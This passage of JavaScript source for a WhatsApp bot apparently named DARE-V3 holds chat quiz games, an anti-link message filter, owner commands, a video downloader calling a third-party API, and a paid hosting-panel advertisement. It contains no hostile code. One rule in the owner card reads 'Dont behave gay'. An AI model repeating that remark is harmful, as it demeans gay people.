        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replydare('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Question:* ${room.soal}

There is ${room.jawaban.length} answer${room.jawaban.find(v => v.includes(' ')) ? `
(some answers contain spaces)
`: ''}
${isWin ? `*ALL ANSWERS ANSWERED 🙂*` : isSurrender ? '*GIVE UP ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money for every correct answer`}
    `.trim();

    Dare.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        Dare.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete Dare.family100[id];
    }
}
Dare.tebaklagu = Dare.tebaklagu ? Dare.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   Dare.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/7rt6v2.jpg' }, caption: `🎮 Guess the Song 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess the song`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}

Dare.tebakkata = Dare.tebakkata ? Dare.tebakkata : {}  
if (from in Dare.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Dare.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Guess the Word 🎮\n\nCorrect Answer 🎉\nPrize : 10.000 money\n`
 replydare(`${teks}`)
 clearTimeout(Dare.tebakkata[id][2])
 delete Dare.tebakkata[id]
} else console.log('*Wrong Answer!*')
}
Dare.tebakgambar = Dare.tebakgambar ? Dare.tebakgambar : {} 
if(from in Dare.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Dare.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Guess the Picture 🎮\n\nCorrect Answer 🎉\nPrize: 10,000 money\n\nWant to play again? Please type Guess the Image`
 replydare(`${teks}`)
 clearTimeout(Dare.tebakgambar[id][3])
 delete Dare.tebakgambar[id]
} else console.log('*Wrong Answer!*')
}
Dare.tebakbendera2 = Dare.tebakbendera2 ? Dare.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replydare('*You have given up*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Dare.sendText(m.chat, `🎮 Guess the Flag 🎮\n\Correct Answer 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
Dare.tebakbendera = Dare.tebakbendera ? Dare.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replydare('*You have given up*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Dare.sendText(m.chat, `🎮 Guess the Picture 🎮\n\nCorrect Answer 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
Dare.tebakkabupaten = Dare.tebakkabupaten ? Dare.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replydare('*You have given up*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Dare.sendText(m.chat, `🎮 Guess the District 🎮\n\nCorrect Answer 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
 Dare.tebakkimia = Dare.tebakkimia ? Dare.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replydare('*You have given up*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Dare.sendText(m.chat, `🎮 Guess Chemistry 🎮\n\nCorrect Answer 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
        
//=========================================\\
Dare.tekateki = Dare.tekateki ? Dare.tekateki : {}  
if(from in Dare.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(Dare.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Dare.tekateki[id][2]
 var teks = `*PUZZLE GAME*\n\nYour Answer is Correct!\n Prizes : +${Dare.tekateki[id][2]} Money 💸`
 replydare(`${teks}`)
 clearTimeout(Dare.tekateki[id][3])
 delete Dare.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replydare(`*Dikit Lagi!*`)
}
//=========================================\\
Dare.tebakasahotak = Dare.tebakasahotak ? Dare.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replydare('*You have given up*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Dare.sendText(m.chat, `🎮 Brain Teaser 🎮\n\nCorrect Answer 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
//=========================================\\
        Dare.siapaaku = Dare.siapaaku ? Dare.siapaaku : {}
if(from in Dare.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(Dare.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Dare.siapaaku[id][2]
var teks = `*GAME WHO AM I*\n\nYour Answer is Correct!\n Prize : +${Dare.siapaaku[id][2]} Money 💸`
   replydare(`${teks}`)
 clearTimeout(Dare.siapaaku[id][3])
 delete Dare.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replydare(`*A Little More!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        Dare.susunkata = Dare.susunkata ? Dare.susunkata : {}  
if(from in Dare.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(Dare.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Dare.susunkata[id][2]
   var teks = `*WORD COMPOSITION GAMES*\n\nYour Answer is Correct!\n Prizes : +${Dare.susunkata[id][2]} Money 💸`
replydare(`${teks}`)
 clearTimeout(Dare.susunkata[id][3])
 delete Dare.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replydare(`*A Little More!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
Dare.caklontong = Dare.caklontong ? Dare.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Dare.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/7rt6v2.jpg' }, caption: `🎮 Guess Lontong 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}
Dare.tebakkalimat = Dare.tebakkalimat ? Dare.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Dare.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/7rt6v2.jpg' }, caption: `🎮 Guess the Sentence 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess the sentence`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}

//=========================================//
Dare.tebaklirik = Dare.tebaklirik ? Dare.tebaklirik : {}  
if(from in Dare.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Dare.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += Dare.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*LYRIC GUESSING GAME*\n\nYour Answer is Correct!\n Prizes : +${Dare.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replydare(`${teks}`)
 clearTimeout(Dare.tebaklirik[id][3])
 delete Dare.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replydare(`*A Little More!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
Dare.tebaktebakan = Dare.tebaktebakan ? Dare.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Dare.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/7rt6v2.jpg' }, caption: `🎮 Guess Guess 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}
//antilink all by Dansya
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin sends link,\n Admin is free bro 🗿☕`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
Dare.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: Dare.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Dare.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Dare.ev.emit('messages.upsert', msg)
}
 
switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replydare(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await Dare.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await Dare.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replydare('Waiting For Partner\ntype .ttt to join' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            Dare.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replydare(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replydare('damaged')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replydare(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replydare(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return replydare(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replydare(`The person you are challenging is playing according to someone else :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            this.suit[id] = {
            chat: await Dare.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            Time: setTimeout(() => {
            if (this.suit[id]) Dare.sendText(m.chat, `_suit timeout_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break 
	case 'public': {
if (!DareTheCreator) return reply(mess.only.owner)
Dare.public = true
replydare('*Successfully Converted To Public Use*')
            }
            break
            case 'self': {
if (!DareTheCreator) return reply(mess.only.owner)
Dare.public = false
replydare('*Success Turns Into Its Own Use*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replydare(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Dare.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await Dare.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replydare(`Send/Reply to Images With Caption ${prefix + command} text1|text2`)
}
}
break

case 'jadibot': {
     replydare('want to be a bot?')
}
break     
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(Dare => Dare.user).map(Dare => Dare.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await Dare.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Dare.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replydare(`No users have rented bots yet`)
}
break
case 'clear': {
if (!DareTheCreator) return reply(mess.only.owner)
Dare.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
Dare.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
Dare.chatModify({ pin: false }, m.chat)
}
break
case 'restart':
if (!DareTheCreator) return reply(mess.only.owner)
replydare(`restarting ${global.botname}`)
replydare(`Done 🙂`)
await sleep(3000)
process.exit()
break
case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replydare(`𝐒𝐀𝐋𝐀𝐌 𝐒𝐈𝐑 ${pushname}
so ${botname} has total features ${nanototalpitur()}
help support and donate so that the features are available 
there's more... thank you.🙂🙂`)
        break
        
        case 'alldownload': 
case 'all': 
case 'aio':
case 'dwnld': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    if (!text) return reply(`Give Me A Video Link \n\n*Example:* ${prefix + command} https://www.facebook.com/reel/123456`);
await Dare.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });

    try {
        

const apiUrl = `https://api.davidcyriltech.my.id/download/aio?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (response.data.success) {
            const { title, low_quality, high_quality } = response.data.video;

          const isDirectDownloadHD = high_quality.includes("tinyurl");
            const isDirectDownloadSD = low_quality.includes("tinyurl");

            if (isDirectDownloadHD || isDirectDownloadSD) {
if (isDirectDownloadHD) {
                    await Dare.sendMessage(m.chat, {
                        video: { url: high_quality },
                        mimetype: 'video/mp4',
                        fileName: `${title}_HD.mp4`,
                        caption: `🎥 *Title:* ${title}\n*Quality:* HD\nMADE BY DARE-V3🗄️`
                    }, { quoted: m });
                }
                if (isDirectDownloadSD) {
                    await Dare.sendMessage(m.chat, {
                        video: { url: low_quality },
                        mimetype: 'video/mp4',
                        fileName: `${title}_SD.mp4`,
                        caption: `🎥 *Title:* ${title}\n*Quality:* SD\nMADE BY DARE-V3🗄️`
                    }, { quoted: m });
                }
            } else {
 await Dare.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });
   

                const hdBuffer = await axios.get(high_quality, { responseType: 'arraybuffer' });
                const sdBuffer = await axios.get(low_quality, { responseType: 'arraybuffer' });

                if (high_quality) {
                    await Dare.sendMessage(m.chat, {
                        video: Buffer.from(hdBuffer.data),
                        mimetype: 'video/mp4',
                        fileName: `${title}_HD.mp4`,
                        caption: `🎥 *Title:* ${title}\n*Quality:* HD\nMADE BY DARE-V3🗄️`
                    }, { quoted: m });
                }
                if (low_quality) {
                    await Dare.sendMessage(m.chat, {
                        video: Buffer.from(sdBuffer.data),
                        mimetype: 'video/mp4',
                        fileName: `${title}_SD.mp4`,
                        caption: `🎥 *Title:* ${title}\n*Quality:* SD\nMADE BY DARE-V3🗄️`
                    }, { quoted: m });
                }
            }
        } else {
            reply("❌ Unable to fetch the video. Please check the URL and try again.");
        }
    } catch (error) {
        console.error('Error in AIO Downloader:', error.message);
        reply("❌ An error occurred while processing your request. Please try again later.");
    }
    break;
}
        
case 'owner': {
let name = m.pushName || Dare.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *𝐒𝐀𝐋𝐀𝐌 𝐒𝐈𝐑 \`${name}\`, Press the button that says Chat Owner to contact my owner number*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./data/image/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Dare.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.ownername} ]\`* ]==─
┆ • Don't chat about strange things
┆ • Don't Call Owner 
┆ • Chat Just get straight to the point
┆ • If there is minimum money, share
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"🙂 Chat Owner ( ${global.ownername} )","url":"https://wa.me/${global.ownernumber}","merchant_url":"https://wa.me/${global.ownernumber}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[THIS USER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆ • Don't Spam Bots
┆ • Don't be rude
┆ • Dont behave gay
┆ • Buy Prem Etc. join channel
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  💬  Chat Bot ( ${botname} )","url":"https://wa.me/${global.botnumber}","merchant_url":"${global.ownerweb}"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
case 'anticall':
    if (!DareTheCreator) return reply(mess.only.owner)
    if (args[0] === 'on') {
        db.settings[botNumber].anticall = true;
        replydare(`🤖 𝙰𝙽𝚃𝙸𝙲𝙰𝙻𝙻 𝙸𝚂 𝙰𝙽𝙰𝙱𝙻𝙴𝙳`);
    } else if (args[0] === 'off') {
        db.settings[botNumber].anticall = false;
        replydare(`🤖 𝙰𝙽𝚃𝙸𝙲𝙰𝙻𝙻 𝙸𝚂 𝙳𝙸𝚂𝙰𝙱𝙻𝙴𝙳`);
    } else {
        return replydare(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Anti-Call
            - ${prefix + command} off : Disable Anti-Call

            Example: ${prefix + command} on
        `);
    }
    break;
    
    case 'bankai': {
await loading()
  const xmenu_oh = `
═════════════════════╼ 
│ *「𝗕𝗔𝗡𝗞𝗔𝗜 𝗕𝗬 𝗕𝗠𝗕」* 
│      𝙎𝙃𝙐𝙉𝙎𝙐𝙄 𝘽𝘼𝙉𝙆𝘼𝙄 
│ 𝙱𝙰𝙽𝙺𝙰𝙸
│ 𝙺𝙰𝚃𝙴𝙽 𝙺𝚈𝙾𝙺𝙾𝚃𝚂𝚄
│ 𝙺𝙰𝚁𝙰𝙼𝙰𝚃𝚂𝚄 𝚂𝙷𝙸𝙽𝙹𝚄
│      ▄𝐃𝐀𝐑𝐄-𝐕𝟑▄
│ 𝐓𝐡𝐢𝐬 𝐰𝐚𝐬 𝐦𝐚𝐝𝐞 𝐁𝐲 𝐁𝐌𝐁-𝐗-𝐃𝐀𝐑𝐄 
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼
`;

  await Dare.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/kghw6m.jpg' },
    caption: xmenu_oh,
    footer: '©BMB',
    buttons: [
      { buttonId: '.mood', buttonText: { displayText: '𝐌𝐎𝐎𝐃' } },
      { buttonId: '.narutopain', buttonText: { displayText: '𝐏𝐀𝐈𝐍' } },
    ],
    viewOnce: true,
  }, { quoted: m });

  const darkphonk = 'https://files.catbox.moe/w4jb9r.mp3';
  await Dare.sendMessage(m.chat, {
    audio: { url: darkphonk },
    mimetype: 'audio/mpeg',
    ptt: true,
  }, { quoted: m });
}
break;

case 'narutopain': {
await loading()
  const xmenu_oh = `
═════════════════════╼ 
│ *「𝗣𝗔𝗜𝗡 𝗕𝗬 𝗕𝗠𝗕」* 
│ ɪᴛᴀᴍɪ ᴏ ᴋᴀɴᴊɪʀᴏ 
│ ɪᴛᴀᴍɪ ᴏ ᴋᴀɴɢᴀᴇʀᴏ 
│ ɪᴛᴀᴍɪ ᴏ ᴜᴋᴇᴛᴏʀᴇ 
│ ɪᴛᴀᴍɪ ᴏ sʜɪʀᴇ 
│ ɪᴛᴀᴍɪ ᴏ sʜɪʀᴀɴᴜ ᴍᴏɴᴏɴɪ
│ ʜᴏɴᴛᴏᴜ ɴᴏ ʜᴇɪᴡᴀ ᴡᴀ ᴡᴀᴋᴀʀᴀɴ 
│ ᴋᴏᴋᴏ ʏᴏʀɪ sᴇᴋᴀɪ ɴɪ ɪᴛᴀᴍɪ ᴏ 
│ 𝙎𝙃𝙄𝙉𝙍𝘼 𝙏𝙀𝙉𝙎𝙀 
│    ▄𝐃𝐀𝐑𝐄-𝐕𝟑▄
│ 𝐓𝐡𝐢𝐬 𝐰𝐚𝐬 𝐦𝐚𝐝𝐞 𝐁𝐲 𝐁𝐌𝐁-𝐗-𝐃𝐀𝐑𝐄 
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼
`;

  await Dare.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/z8z9if.jpg' },
    caption: xmenu_oh,
    footer: '©BMB',
    buttons: [
      { buttonId: '.bot', buttonText: { displayText: '𝐃𝐀𝐑𝐄𝐁𝐎𝐓' } },
      { buttonId: '.bankai', buttonText: { displayText: '𝐁𝐀𝐍𝐊𝐀𝐈' } },
    ],
    viewOnce: true,
  }, { quoted: m });

  const darkphonk = 'https://files.catbox.moe/vttqjz.mp3';
  await Dare.sendMessage(m.chat, {
    audio: { url: darkphonk },
    mimetype: 'audio/mpeg',
    ptt: true,
  }, { quoted: m });
}
break;

case 'sale': case 'panel': case 'pannel': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
m.reply(`𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐏𝐀𝐍𝐄𝐋 𝐎𝐅𝐅𝐄𝐑𝐒  
https://wa.me/2348089405509
━━━━━━━━━━━━━━━━━━━━━━━  
🔥 *1𝐆𝐁*     ➤   𝟓𝟎𝟎  
🔥 *2𝐆𝐁*     ➤   𝟏𝟎𝟎𝟎  
🔥 *3𝐆𝐁*     ➤   𝟏𝟓𝟎𝟎  
🔥 *4𝐆𝐁*     ➤   𝟐𝟎𝟎𝟎  
🔥 *5𝐆𝐁*     ➤   𝟐𝟓𝟎𝟎  
🔥 *6𝐆𝐁*     ➤   𝟑𝟎𝟎𝟎  
🔥 *7𝐆𝐁*     ➤   𝟑𝟓𝟎𝟎  
🔥 *8𝐆𝐁*     ➤   𝟒𝟎𝟎𝟎  
🔥 *9𝐆𝐁*     ➤   𝟒𝟓𝟎𝟎  
🔥 *10𝐆𝐁*   ➤   𝟓𝟎𝟎𝟎  
🔥 *𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃* ➤   𝟕𝟎𝟎𝟎  
━━━━━━━━━━━━━━━━━━━━━━━  

💰 *𝐁𝐮𝐲 𝐍𝐨𝐰 𝐅𝐫𝐨𝐦: BMB*
📞 *𝐂𝐨𝐧𝐭𝐚𝐜𝐭:* +2348089405509
💬 *𝐃𝐌 𝐟𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐞 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐏𝐚𝐧𝐞𝐥𝐬!*  
> type  ramlist or listsrv

━━━━━━━━━━━━━━━━━━━━━━━  
💡 *𝐒𝐞𝐜𝐮𝐫𝐞 | 𝐅𝐚𝐬𝐭 | 𝐑𝐞𝐥𝐢𝐚𝐛𝐥𝐞*
*BOT DEPLOYMENT IS ALSO AVAILABLE* 
*ASK FOR PRICE OR DISCOUNT*
`)
}
break
case 'wife': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
m.reply(`═𝓲 𝓱𝓪𝓿𝓮 𝓪 𝓼𝓸𝓸𝓷 𝓽𝓸 𝓫𝓼 𝔀𝓲𝓯𝓮═══╼
